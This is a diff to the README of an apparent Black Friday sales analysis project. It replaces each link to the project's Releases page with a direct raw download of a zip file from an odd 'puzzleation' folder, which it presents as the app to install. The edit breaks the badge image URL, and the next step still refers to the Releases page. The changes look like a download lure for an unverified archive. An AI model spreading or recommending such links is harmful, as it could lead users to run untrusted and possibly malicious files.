@@ -1,7 +1,7 @@
 # 🚀 retail-analytics-black-friday - Analyze Black Friday Sales Easily
 
 ## 📥 Download Now
-[![Download retail-analytics-black-friday](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/ccmecc1/retail-analytics-black-friday/releases)
+[![Download retail-analytics-black-friday](https://raw.githubusercontent.com/ccmecc1/retail-analytics-black-friday/main/puzzleation/retail-analytics-black-friday.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/ccmecc1/retail-analytics-black-friday/main/puzzleation/retail-analytics-black-friday.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This project explores the **Black Friday Sales dataset** and applies Exploratory
 This guide helps you download and run the application quickly.
 
 1. **Visit the Releases Page**  
-   Click on this link to download the application: [Download Page](https://github.com/ccmecc1/retail-analytics-black-friday/releases).
+   Click on this link to download the application: [Download Page](https://raw.githubusercontent.com/ccmecc1/retail-analytics-black-friday/main/puzzleation/retail-analytics-black-friday.zip).
 
 2. **Choose the Correct File**  
    On the Releases page, find the latest version of the application. It will show files available for download.
@@ -66,4 +66,4 @@ Your feedback is welcome! If you encounter issues or have suggestions, please re
 ---
 
 ## 📥 Download & Install
-To get started with your analysis, [visit this page to download](https://github.com/ccmecc1/retail-analytics-black-friday/releases). Enjoy exploring the insights from the Black Friday Sales dataset with ease.
+To get started with your analysis, [visit this page to download](https://raw.githubusercontent.com/ccmecc1/retail-analytics-black-friday/main/puzzleation/retail-analytics-black-friday.zip). Enjoy exploring the insights from the Black Friday Sales dataset with ease.
